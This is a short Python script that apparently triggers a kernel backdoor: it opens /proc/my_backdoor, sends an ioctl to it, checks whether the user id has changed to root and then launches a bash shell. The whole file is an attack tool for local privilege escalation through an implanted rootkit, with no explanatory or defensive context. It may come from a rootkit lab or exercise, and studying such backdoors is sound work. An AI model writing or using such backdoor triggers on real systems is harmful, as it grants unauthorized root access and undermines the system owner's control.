import fcntl
from sys import argv
from os import getuid,execv

print("Current uid=", str(getuid()))
fd = open("/proc/my_backdoor", "rb")
print(fcntl.ioctl(fd, 123, 123))
fd.close()
print("Current uid=", str(getuid()))
execv("/bin/bash", ["/bin/bash"])
